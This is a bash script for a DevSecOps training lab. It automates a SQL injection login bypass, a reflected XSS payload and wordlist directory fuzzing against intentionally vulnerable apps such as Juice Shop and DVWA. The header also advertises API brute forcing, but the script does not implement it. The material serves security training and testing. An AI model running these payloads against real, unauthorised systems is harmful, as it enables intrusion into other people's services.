#!/bin/bash
# attack-automation.sh
# Comprehensive Automated Attack Runner for DevSecOps Lab
# -------------------------------------------------------
# Purpose:
#   This script automates common attack workflows used during vulnerability
#   assessments in DVWA, Juice Shop, Mutillidae, and WebGoat.
#   It demonstrates repeatable offensive testing aligned with CI/CD security gates.
#
# Key Features:
#   - Automated SQLi testing
#   - Automated XSS payload delivery
#   - Automated HTTP fuzzing
#   - API brute forcing
#   - Log output routing for SIEM ingestion
#
# Usage:
#   ./attack-automation.sh <target-url>
#   Example: ./attack-automation.sh http://localhost:3000
# -------------------------------------------------------

TARGET="$1"
LOG_DIR="/opt/devsecops-lab/logs"
mkdir -p "$LOG_DIR"

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target-url>"
  exit 1
fi

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_DIR/attack.log"
}

run_sqli_test() {
  log "Running SQL Injection test..."
  curl -s -X POST "$TARGET/rest/user/login" \
    -H 'Content-Type: application/json' \
    -d '{"email":"'"' OR 1=1--"'","password":"anything"}' \
    | tee -a "$LOG_DIR/sqli.log"
}

run_xss_test() {
  log "Running XSS test..."
  curl -s "$TARGET/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
    | tee -a "$LOG_DIR/xss.log"
}

run_fuzz_test() {
  log "Running fuzz test..."
  wordlist="/usr/share/wordlists/dirb/common.txt"
  while read -r DIR; do
    CODE=$(curl -o /dev/null -s -w "%{http_code}" "$TARGET/$DIR")
    echo "$DIR - $CODE" | tee -a "$LOG_DIR/fuzz.log"
  done < "$wordlist"
}

log "Starting automated attack sequence on $TARGET"
run_sqli_test
run_xss_test
run_fuzz_test
log "Attack automation completed."
